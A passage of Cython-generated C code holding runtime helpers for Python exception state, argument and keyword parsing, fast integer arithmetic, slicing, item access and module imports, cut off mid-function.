#if CYTHON_FAST_THREAD_STATE
static CYTHON_INLINE void __Pyx_ErrRestoreInState(PyThreadState *tstate, PyObject *type, PyObject *value, PyObject *tb) {
    PyObject *tmp_type, *tmp_value, *tmp_tb;
    tmp_type = tstate->curexc_type;
    tmp_value = tstate->curexc_value;
    tmp_tb = tstate->curexc_traceback;
    tstate->curexc_type = type;
    tstate->curexc_value = value;
    tstate->curexc_traceback = tb;
    Py_XDECREF(tmp_type);
    Py_XDECREF(tmp_value);
    Py_XDECREF(tmp_tb);
}
static CYTHON_INLINE void __Pyx_ErrFetchInState(PyThreadState *tstate, PyObject **type, PyObject **value, PyObject **tb) {
    *type = tstate->curexc_type;
    *value = tstate->curexc_value;
    *tb = tstate->curexc_traceback;
    tstate->curexc_type = 0;
    tstate->curexc_value = 0;
    tstate->curexc_traceback = 0;
}
#endif

/* RaiseArgTupleInvalid */
static void __Pyx_RaiseArgtupleInvalid(
    const char* func_name,
    int exact,
    Py_ssize_t num_min,
    Py_ssize_t num_max,
    Py_ssize_t num_found)
{
    Py_ssize_t num_expected;
    const char *more_or_less;
    if (num_found < num_min) {
        num_expected = num_min;
        more_or_less = "at least";
    } else {
        num_expected = num_max;
        more_or_less = "at most";
    }
    if (exact) {
        more_or_less = "exactly";
    }
    PyErr_Format(PyExc_TypeError,
                 "%.200s() takes %.8s %" CYTHON_FORMAT_SSIZE_T "d positional argument%.1s (%" CYTHON_FORMAT_SSIZE_T "d given)",
                 func_name, more_or_less, num_expected,
                 (num_expected == 1) ? "" : "s", num_found);
}

/* RaiseDoubleKeywords */
static void __Pyx_RaiseDoubleKeywordsError(
    const char* func_name,
    PyObject* kw_name)
{
    PyErr_Format(PyExc_TypeError,
        #if PY_MAJOR_VERSION >= 3
        "%s() got multiple values for keyword argument '%U'", func_name, kw_name);
        #else
        "%s() got multiple values for keyword argument '%s'", func_name,
        PyString_AsString(kw_name));
        #endif
}

/* ParseKeywords */
static int __Pyx_ParseOptionalKeywords(
    PyObject *kwds,
    PyObject **argnames[],
    PyObject *kwds2,
    PyObject *values[],
    Py_ssize_t num_pos_args,
    const char* function_name)
{
    PyObject *key = 0, *value = 0;
    Py_ssize_t pos = 0;
    PyObject*** name;
    PyObject*** first_kw_arg = argnames + num_pos_args;
    while (PyDict_Next(kwds, &pos, &key, &value)) {
        name = first_kw_arg;
        while (*name && (**name != key)) name++;
        if (*name) {
            values[name-argnames] = value;
            continue;
        }
        name = first_kw_arg;
        #if PY_MAJOR_VERSION < 3
        if (likely(PyString_Check(key))) {
            while (*name) {
                if ((CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**name) == PyString_GET_SIZE(key))
                        && _PyString_Eq(**name, key)) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    if ((**argname == key) || (
                            (CYTHON_COMPILING_IN_PYPY || PyString_GET_SIZE(**argname) == PyString_GET_SIZE(key))
                             && _PyString_Eq(**argname, key))) {
                        goto arg_passed_twice;
                    }
                    argname++;
                }
            }
        } else
        #endif
        if (likely(PyUnicode_Check(key))) {
            while (*name) {
                int cmp = (**name == key) ? 0 :
                #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                    (__Pyx_PyUnicode_GET_LENGTH(**name) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                #endif
                    PyUnicode_Compare(**name, key);
                if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                if (cmp == 0) {
                    values[name-argnames] = value;
                    break;
                }
                name++;
            }
            if (*name) continue;
            else {
                PyObject*** argname = argnames;
                while (argname != first_kw_arg) {
                    int cmp = (**argname == key) ? 0 :
                    #if !CYTHON_COMPILING_IN_PYPY && PY_MAJOR_VERSION >= 3
                        (__Pyx_PyUnicode_GET_LENGTH(**argname) != __Pyx_PyUnicode_GET_LENGTH(key)) ? 1 :
                    #endif
                        PyUnicode_Compare(**argname, key);
                    if (cmp < 0 && unlikely(PyErr_Occurred())) goto bad;
                    if (cmp == 0) goto arg_passed_twice;
                    argname++;
                }
            }
        } else
            goto invalid_keyword_type;
        if (kwds2) {
            if (unlikely(PyDict_SetItem(kwds2, key, value))) goto bad;
        } else {
            goto invalid_keyword;
        }
    }
    return 0;
arg_passed_twice:
    __Pyx_RaiseDoubleKeywordsError(function_name, key);
    goto bad;
invalid_keyword_type:
    PyErr_Format(PyExc_TypeError,
        "%.200s() keywords must be strings", function_name);
    goto bad;
invalid_keyword:
    PyErr_Format(PyExc_TypeError,
    #if PY_MAJOR_VERSION < 3
        "%.200s() got an unexpected keyword argument '%.200s'",
        function_name, PyString_AsString(key));
    #else
        "%s() got an unexpected keyword argument '%U'",
        function_name, key);
    #endif
bad:
    return -1;
}

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_AddObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a + b);
            if (likely((x^a) >= 0 || (x^b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_add(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = -(long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
                        a = (long) (((((((unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 3 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = -(long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 4:
                    if (8 * sizeof(long) - 1 > 4 * PyLong_SHIFT) {
                        a = (long) (((((((((unsigned long)digits[3]) << PyLong_SHIFT) | (unsigned long)digits[2]) << PyLong_SHIFT) | (unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 4 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((((((unsigned PY_LONG_LONG)digits[3]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[2]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                default: return PyLong_Type.tp_as_number->nb_add(op1, op2);
            }
        }
                x = a + b;
            return PyLong_FromLong(x);
#ifdef HAVE_LONG_LONG
        long_long:
                llx = lla + llb;
            return PyLong_FromLongLong(llx);
#endif
        
        
    }
    #endif
    if (PyFloat_CheckExact(op1)) {
        const long b = intval;
        double a = PyFloat_AS_DOUBLE(op1);
            double result;
            PyFPE_START_PROTECT("add", return NULL)
            result = ((double)a) + (double)b;
            PyFPE_END_PROTECT(result)
            return PyFloat_FromDouble(result);
    }
    return (inplace ? PyNumber_InPlaceAdd : PyNumber_Add)(op1, op2);
}
#endif

/* None */
static CYTHON_INLINE void __Pyx_RaiseUnboundLocalError(const char *varname) {
    PyErr_Format(PyExc_UnboundLocalError, "local variable '%s' referenced before assignment", varname);
}

/* FastTypeChecks */
#if CYTHON_COMPILING_IN_CPYTHON
static int __Pyx_InBases(PyTypeObject *a, PyTypeObject *b) {
    while (a) {
        a = a->tp_base;
        if (a == b)
            return 1;
    }
    return b == &PyBaseObject_Type;
}
static CYTHON_INLINE int __Pyx_IsSubtype(PyTypeObject *a, PyTypeObject *b) {
    PyObject *mro;
    if (a == b) return 1;
    mro = a->tp_mro;
    if (likely(mro)) {
        Py_ssize_t i, n;
        n = PyTuple_GET_SIZE(mro);
        for (i = 0; i < n; i++) {
            if (PyTuple_GET_ITEM(mro, i) == (PyObject *)b)
                return 1;
        }
        return 0;
    }
    return __Pyx_InBases(a, b);
}
#if PY_MAJOR_VERSION == 2
static int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject* exc_type2) {
    PyObject *exception, *value, *tb;
    int res;
    __Pyx_PyThreadState_declare
    __Pyx_PyThreadState_assign
    __Pyx_ErrFetch(&exception, &value, &tb);
    res = exc_type1 ? PyObject_IsSubclass(err, exc_type1) : 0;
    if (unlikely(res == -1)) {
        PyErr_WriteUnraisable(err);
        res = 0;
    }
    if (!res) {
        res = PyObject_IsSubclass(err, exc_type2);
        if (unlikely(res == -1)) {
            PyErr_WriteUnraisable(err);
            res = 0;
        }
    }
    __Pyx_ErrRestore(exception, value, tb);
    return res;
}
#else
static CYTHON_INLINE int __Pyx_inner_PyErr_GivenExceptionMatches2(PyObject *err, PyObject* exc_type1, PyObject *exc_type2) {
    int res = exc_type1 ? __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type1) : 0;
    if (!res) {
        res = __Pyx_IsSubtype((PyTypeObject*)err, (PyTypeObject*)exc_type2);
    }
    return res;
}
#endif
static int __Pyx_PyErr_GivenExceptionMatchesTuple(PyObject *exc_type, PyObject *tuple) {
    Py_ssize_t i, n;
    assert(PyExceptionClass_Check(exc_type));
    n = PyTuple_GET_SIZE(tuple);
#if PY_MAJOR_VERSION >= 3
    for (i=0; i<n; i++) {
        if (exc_type == PyTuple_GET_ITEM(tuple, i)) return 1;
    }
#endif
    for (i=0; i<n; i++) {
        PyObject *t = PyTuple_GET_ITEM(tuple, i);
        #if PY_MAJOR_VERSION < 3
        if (likely(exc_type == t)) return 1;
        #endif
        if (likely(PyExceptionClass_Check(t))) {
            if (__Pyx_inner_PyErr_GivenExceptionMatches2(exc_type, NULL, t)) return 1;
        } else {
        }
    }
    return 0;
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches(PyObject *err, PyObject* exc_type) {
    if (likely(err == exc_type)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        if (likely(PyExceptionClass_Check(exc_type))) {
            return __Pyx_inner_PyErr_GivenExceptionMatches2(err, NULL, exc_type);
        } else if (likely(PyTuple_Check(exc_type))) {
            return __Pyx_PyErr_GivenExceptionMatchesTuple(err, exc_type);
        } else {
        }
    }
    return PyErr_GivenExceptionMatches(err, exc_type);
}
static CYTHON_INLINE int __Pyx_PyErr_GivenExceptionMatches2(PyObject *err, PyObject *exc_type1, PyObject *exc_type2) {
    assert(PyExceptionClass_Check(exc_type1));
    assert(PyExceptionClass_Check(exc_type2));
    if (likely(err == exc_type1 || err == exc_type2)) return 1;
    if (likely(PyExceptionClass_Check(err))) {
        return __Pyx_inner_PyErr_GivenExceptionMatches2(err, exc_type1, exc_type2);
    }
    return (PyErr_GivenExceptionMatches(err, exc_type1) || PyErr_GivenExceptionMatches(err, exc_type2));
}
#endif

/* SliceObject */
static CYTHON_INLINE PyObject* __Pyx_PyObject_GetSlice(PyObject* obj,
        Py_ssize_t cstart, Py_ssize_t cstop,
        PyObject** _py_start, PyObject** _py_stop, PyObject** _py_slice,
        int has_cstart, int has_cstop, CYTHON_UNUSED int wraparound) {
#if CYTHON_USE_TYPE_SLOTS
    PyMappingMethods* mp;
#if PY_MAJOR_VERSION < 3
    PySequenceMethods* ms = Py_TYPE(obj)->tp_as_sequence;
    if (likely(ms && ms->sq_slice)) {
        if (!has_cstart) {
            if (_py_start && (*_py_start != Py_None)) {
                cstart = __Pyx_PyIndex_AsSsize_t(*_py_start);
                if ((cstart == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstart = 0;
        }
        if (!has_cstop) {
            if (_py_stop && (*_py_stop != Py_None)) {
                cstop = __Pyx_PyIndex_AsSsize_t(*_py_stop);
                if ((cstop == (Py_ssize_t)-1) && PyErr_Occurred()) goto bad;
            } else
                cstop = PY_SSIZE_T_MAX;
        }
        if (wraparound && unlikely((cstart < 0) | (cstop < 0)) && likely(ms->sq_length)) {
            Py_ssize_t l = ms->sq_length(obj);
            if (likely(l >= 0)) {
                if (cstop < 0) {
                    cstop += l;
                    if (cstop < 0) cstop = 0;
                }
                if (cstart < 0) {
                    cstart += l;
                    if (cstart < 0) cstart = 0;
                }
            } else {
                if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                    goto bad;
                PyErr_Clear();
            }
        }
        return ms->sq_slice(obj, cstart, cstop);
    }
#endif
    mp = Py_TYPE(obj)->tp_as_mapping;
    if (likely(mp && mp->mp_subscript))
#endif
    {
        PyObject* result;
        PyObject *py_slice, *py_start, *py_stop;
        if (_py_slice) {
            py_slice = *_py_slice;
        } else {
            PyObject* owned_start = NULL;
            PyObject* owned_stop = NULL;
            if (_py_start) {
                py_start = *_py_start;
            } else {
                if (has_cstart) {
                    owned_start = py_start = PyInt_FromSsize_t(cstart);
                    if (unlikely(!py_start)) goto bad;
                } else
                    py_start = Py_None;
            }
            if (_py_stop) {
                py_stop = *_py_stop;
            } else {
                if (has_cstop) {
                    owned_stop = py_stop = PyInt_FromSsize_t(cstop);
                    if (unlikely(!py_stop)) {
                        Py_XDECREF(owned_start);
                        goto bad;
                    }
                } else
                    py_stop = Py_None;
            }
            py_slice = PySlice_New(py_start, py_stop, Py_None);
            Py_XDECREF(owned_start);
            Py_XDECREF(owned_stop);
            if (unlikely(!py_slice)) goto bad;
        }
#if CYTHON_USE_TYPE_SLOTS
        result = mp->mp_subscript(obj, py_slice);
#else
        result = PyObject_GetItem(obj, py_slice);
#endif
        if (!_py_slice) {
            Py_DECREF(py_slice);
        }
        return result;
    }
    PyErr_Format(PyExc_TypeError,
        "'%.200s' object is unsliceable", Py_TYPE(obj)->tp_name);
bad:
    return NULL;
}

/* RaiseTooManyValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseTooManyValuesError(Py_ssize_t expected) {
    PyErr_Format(PyExc_ValueError,
                 "too many values to unpack (expected %" CYTHON_FORMAT_SSIZE_T "d)", expected);
}

/* RaiseNeedMoreValuesToUnpack */
static CYTHON_INLINE void __Pyx_RaiseNeedMoreValuesError(Py_ssize_t index) {
    PyErr_Format(PyExc_ValueError,
                 "need more than %" CYTHON_FORMAT_SSIZE_T "d value%.1s to unpack",
                 index, (index == 1) ? "" : "s");
}

/* IterFinish */
static CYTHON_INLINE int __Pyx_IterFinish(void) {
#if CYTHON_FAST_THREAD_STATE
    PyThreadState *tstate = __Pyx_PyThreadState_Current;
    PyObject* exc_type = tstate->curexc_type;
    if (unlikely(exc_type)) {
        if (likely(__Pyx_PyErr_GivenExceptionMatches(exc_type, PyExc_StopIteration))) {
            PyObject *exc_value, *exc_tb;
            exc_value = tstate->curexc_value;
            exc_tb = tstate->curexc_traceback;
            tstate->curexc_type = 0;
            tstate->curexc_value = 0;
            tstate->curexc_traceback = 0;
            Py_DECREF(exc_type);
            Py_XDECREF(exc_value);
            Py_XDECREF(exc_tb);
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#else
    if (unlikely(PyErr_Occurred())) {
        if (likely(PyErr_ExceptionMatches(PyExc_StopIteration))) {
            PyErr_Clear();
            return 0;
        } else {
            return -1;
        }
    }
    return 0;
#endif
}

/* UnpackItemEndCheck */
static int __Pyx_IternextUnpackEndCheck(PyObject *retval, Py_ssize_t expected) {
    if (unlikely(retval)) {
        Py_DECREF(retval);
        __Pyx_RaiseTooManyValuesError(expected);
        return -1;
    } else {
        return __Pyx_IterFinish();
    }
    return 0;
}

/* GetItemInt */
static PyObject *__Pyx_GetItemInt_Generic(PyObject *o, PyObject* j) {
    PyObject *r;
    if (!j) return NULL;
    r = PyObject_GetItem(o, j);
    Py_DECREF(j);
    return r;
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_List_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyList_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyList_GET_SIZE(o)))) {
        PyObject *r = PyList_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Tuple_Fast(PyObject *o, Py_ssize_t i,
                                                              CYTHON_NCP_UNUSED int wraparound,
                                                              CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
    Py_ssize_t wrapped_i = i;
    if (wraparound & unlikely(i < 0)) {
        wrapped_i += PyTuple_GET_SIZE(o);
    }
    if ((!boundscheck) || likely(__Pyx_is_valid_index(wrapped_i, PyTuple_GET_SIZE(o)))) {
        PyObject *r = PyTuple_GET_ITEM(o, wrapped_i);
        Py_INCREF(r);
        return r;
    }
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
#else
    return PySequence_GetItem(o, i);
#endif
}
static CYTHON_INLINE PyObject *__Pyx_GetItemInt_Fast(PyObject *o, Py_ssize_t i, int is_list,
                                                     CYTHON_NCP_UNUSED int wraparound,
                                                     CYTHON_NCP_UNUSED int boundscheck) {
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS && CYTHON_USE_TYPE_SLOTS
    if (is_list || PyList_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyList_GET_SIZE(o);
        if ((!boundscheck) || (likely(__Pyx_is_valid_index(n, PyList_GET_SIZE(o))))) {
            PyObject *r = PyList_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    }
    else if (PyTuple_CheckExact(o)) {
        Py_ssize_t n = ((!wraparound) | likely(i >= 0)) ? i : i + PyTuple_GET_SIZE(o);
        if ((!boundscheck) || likely(__Pyx_is_valid_index(n, PyTuple_GET_SIZE(o)))) {
            PyObject *r = PyTuple_GET_ITEM(o, n);
            Py_INCREF(r);
            return r;
        }
    } else {
        PySequenceMethods *m = Py_TYPE(o)->tp_as_sequence;
        if (likely(m && m->sq_item)) {
            if (wraparound && unlikely(i < 0) && likely(m->sq_length)) {
                Py_ssize_t l = m->sq_length(o);
                if (likely(l >= 0)) {
                    i += l;
                } else {
                    if (!PyErr_ExceptionMatches(PyExc_OverflowError))
                        return NULL;
                    PyErr_Clear();
                }
            }
            return m->sq_item(o, i);
        }
    }
#else
    if (is_list || PySequence_Check(o)) {
        return PySequence_GetItem(o, i);
    }
#endif
    return __Pyx_GetItemInt_Generic(o, PyInt_FromSsize_t(i));
}

/* StringJoin */
#if !CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_PyBytes_Join(PyObject* sep, PyObject* values) {
    return PyObject_CallMethodObjArgs(sep, __pyx_n_s_join, values, NULL);
}
#endif

/* UnpackUnboundCMethod */
static int __Pyx_TryUnpackUnboundCMethod(__Pyx_CachedCFunction* target) {
    PyObject *method;
    method = __Pyx_PyObject_GetAttrStr(target->type, *target->method_name);
    if (unlikely(!method))
        return -1;
    target->method = method;
#if CYTHON_COMPILING_IN_CPYTHON
    #if PY_MAJOR_VERSION >= 3
    if (likely(__Pyx_TypeCheck(method, &PyMethodDescr_Type)))
    #endif
    {
        PyMethodDescrObject *descr = (PyMethodDescrObject*) method;
        target->func = descr->d_method->ml_meth;
        target->flag = descr->d_method->ml_flags & ~(METH_CLASS | METH_STATIC | METH_COEXIST | METH_STACKLESS);
    }
#endif
    return 0;
}

/* CallUnboundCMethod1 */
#if CYTHON_COMPILING_IN_CPYTHON
static CYTHON_INLINE PyObject* __Pyx_CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg) {
    if (likely(cfunc->func)) {
        int flag = cfunc->flag;
        if (flag == METH_O) {
            return (*(cfunc->func))(self, arg);
        } else if (PY_VERSION_HEX >= 0x030600B1 && flag == METH_FASTCALL) {
            if (PY_VERSION_HEX >= 0x030700A0) {
                return (*(__Pyx_PyCFunctionFast)(void*)(PyCFunction)cfunc->func)(self, &arg, 1);
            } else {
                return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, &arg, 1, NULL);
            }
        } else if (PY_VERSION_HEX >= 0x030700A0 && flag == (METH_FASTCALL | METH_KEYWORDS)) {
            return (*(__Pyx_PyCFunctionFastWithKeywords)(void*)(PyCFunction)cfunc->func)(self, &arg, 1, NULL);
        }
    }
    return __Pyx__CallUnboundCMethod1(cfunc, self, arg);
}
#endif
static PyObject* __Pyx__CallUnboundCMethod1(__Pyx_CachedCFunction* cfunc, PyObject* self, PyObject* arg){
    PyObject *args, *result = NULL;
    if (unlikely(!cfunc->func && !cfunc->method) && unlikely(__Pyx_TryUnpackUnboundCMethod(cfunc) < 0)) return NULL;
#if CYTHON_COMPILING_IN_CPYTHON
    if (cfunc->func && (cfunc->flag & METH_VARARGS)) {
        args = PyTuple_New(1);
        if (unlikely(!args)) goto bad;
        Py_INCREF(arg);
        PyTuple_SET_ITEM(args, 0, arg);
        if (cfunc->flag & METH_KEYWORDS)
            result = (*(PyCFunctionWithKeywords)(void*)(PyCFunction)cfunc->func)(self, args, NULL);
        else
            result = (*cfunc->func)(self, args);
    } else {
        args = PyTuple_New(2);
        if (unlikely(!args)) goto bad;
        Py_INCREF(self);
        PyTuple_SET_ITEM(args, 0, self);
        Py_INCREF(arg);
        PyTuple_SET_ITEM(args, 1, arg);
        result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
    }
#else
    args = PyTuple_Pack(2, self, arg);
    if (unlikely(!args)) goto bad;
    result = __Pyx_PyObject_Call(cfunc->method, args, NULL);
#endif
bad:
    Py_XDECREF(args);
    return result;
}

/* Import */
static PyObject *__Pyx_Import(PyObject *name, PyObject *from_list, int level) {
    PyObject *empty_list = 0;
    PyObject *module = 0;
    PyObject *global_dict = 0;
    PyObject *empty_dict = 0;
    PyObject *list;
    #if PY_MAJOR_VERSION < 3
    PyObject *py_import;
    py_import = __Pyx_PyObject_GetAttrStr(__pyx_b, __pyx_n_s_import);
    if (!py_import)
        goto bad;
    #endif
    if (from_list)
        list = from_list;
    else {
        empty_list = PyList_New(0);
        if (!empty_list)
            goto bad;
        list = empty_list;
    }
    global_dict = PyModule_GetDict(__pyx_m);
    if (!global_dict)
        goto bad;
    empty_dict = PyDict_New();
    if (!empty_dict)
        goto bad;
    {
        #if PY_MAJOR_VERSION >= 3
        if (level == -1) {
            if ((1) && (strchr(__Pyx_MODULE_NAME, '.'))) {
                module = PyImport_ImportModuleLevelObject(
                    name, global_dict, empty_dict, list, 1);
                if (!module) {
                    if (!PyErr_ExceptionMatches(PyExc_ImportError))
                        goto bad;
                    PyErr_Clear();
                }
            }
            level = 0;
        }
        #endif
        if (!module) {
            #if PY_MAJOR_VERSION < 3
            PyObject *py_level = PyInt_FromLong(level);
            if (!py_level)
                goto bad;
            module = PyObject_CallFunctionObjArgs(py_import,
                name, global_dict, empty_dict, list, py_level, (PyObject *)NULL);
            Py_DECREF(py_level);
            #else
            module = PyImport_ImportModuleLevelObject(
                name, global_dict, empty_dict, list, level);
            #endif
        }
    }
bad:
    #if PY_MAJOR_VERSION < 3
    Py_XDECREF(py_import);
    #endif
    Py_XDECREF(empty_list);
    Py_XDECREF(empty_dict);
    return module;
}

/* ImportFrom */
static PyObject* __Pyx_ImportFrom(PyObject* module, PyObject* name) {
    PyObject* value = __Pyx_PyObject_GetAttrStr(module, name);
    if (unlikely(!value) && PyErr_ExceptionMatches(PyExc_AttributeError)) {
        PyErr_Format(PyExc_ImportError,
        #if PY_MAJOR_VERSION < 3
            "cannot import name %.230s", PyString_AS_STRING(name));
        #else
            "cannot import name %S", name);
        #endif
    }
    return value;
}

/* PyIntBinop */
#if !CYTHON_COMPILING_IN_PYPY
static PyObject* __Pyx_PyInt_SubtractObjC(PyObject *op1, PyObject *op2, CYTHON_UNUSED long intval, int inplace, int zerodivision_check) {
    (void)inplace;
    (void)zerodivision_check;
    #if PY_MAJOR_VERSION < 3
    if (likely(PyInt_CheckExact(op1))) {
        const long b = intval;
        long x;
        long a = PyInt_AS_LONG(op1);
            x = (long)((unsigned long)a - b);
            if (likely((x^a) >= 0 || (x^~b) >= 0))
                return PyInt_FromLong(x);
            return PyLong_Type.tp_as_number->nb_subtract(op1, op2);
    }
    #endif
    #if CYTHON_USE_PYLONG_INTERNALS
    if (likely(PyLong_CheckExact(op1))) {
        const long b = intval;
        long a, x;
#ifdef HAVE_LONG_LONG
        const PY_LONG_LONG llb = intval;
        PY_LONG_LONG lla, llx;
#endif
        const digit* digits = ((PyLongObject*)op1)->ob_digit;
        const Py_ssize_t size = Py_SIZE(op1);
        if (likely(__Pyx_sst_abs(size) <= 1)) {
            a = likely(size) ? digits[0] : 0;
            if (size == -1) a = -a;
        } else {
            switch (size) {
                case -2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = -(long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = -(PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case 2:
                    if (8 * sizeof(long) - 1 > 2 * PyLong_SHIFT) {
                        a = (long) (((((unsigned long)digits[1]) << PyLong_SHIFT) | (unsigned long)digits[0]));
                        break;
#ifdef HAVE_LONG_LONG
                    } else if (8 * sizeof(PY_LONG_LONG) - 1 > 2 * PyLong_SHIFT) {
                        lla = (PY_LONG_LONG) (((((unsigned PY_LONG_LONG)digits[1]) << PyLong_SHIFT) | (unsigned PY_LONG_LONG)digits[0]));
                        goto long_long;
#endif
                    }
                    CYTHON_FALLTHROUGH;
                case -3:
                    if (8 * sizeof(long) - 1 > 3 * PyLong_SHIFT) {
